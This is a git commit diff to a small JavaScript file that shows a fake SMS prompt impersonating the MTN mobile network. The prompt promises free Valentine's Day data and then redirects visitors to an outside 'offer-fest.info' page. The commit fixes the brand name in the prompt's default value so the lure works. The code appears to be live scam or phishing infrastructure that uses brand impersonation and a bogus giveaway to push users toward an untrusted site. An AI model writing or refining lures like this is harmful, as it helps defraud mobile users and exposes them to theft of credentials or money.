0ce25e368d7c494288f9992a37e914ed71d9cec4
ekpesense <abantak9@gmail.com>
2025-02-11 09:10:23 +0100

    Update activation-mtn-valentine.data.js

--- activation-mtn-valentine.data.js
+++ activation-mtn-valentine.data.js
@@ -1,5 +1,5 @@
 var password = 'MTN 50 Go'
-password=prompt('SMS:Cher client, veuillez vérifier si votre carte SIM MTN est éligible pour recevoir 5 Go de données illimitées, récompense client de la Saint-Valentin, appuyez sur 50 Go pour activer maintenant. ','Airtel 50 Go');
-if (password != 'Airtel 50 Go') {
+password=prompt('SMS:Cher client, veuillez vérifier si votre carte SIM MTN est éligible pour recevoir 5 Go de données illimitées, récompense client de la Saint-Valentin, appuyez sur 50 Go pour activer maintenant. ','MTN 50 Go');
+if (password != 'MTN 50 Go') {
 location.href='https://offer-fest.info/mtn-valentine.data.html';
 }
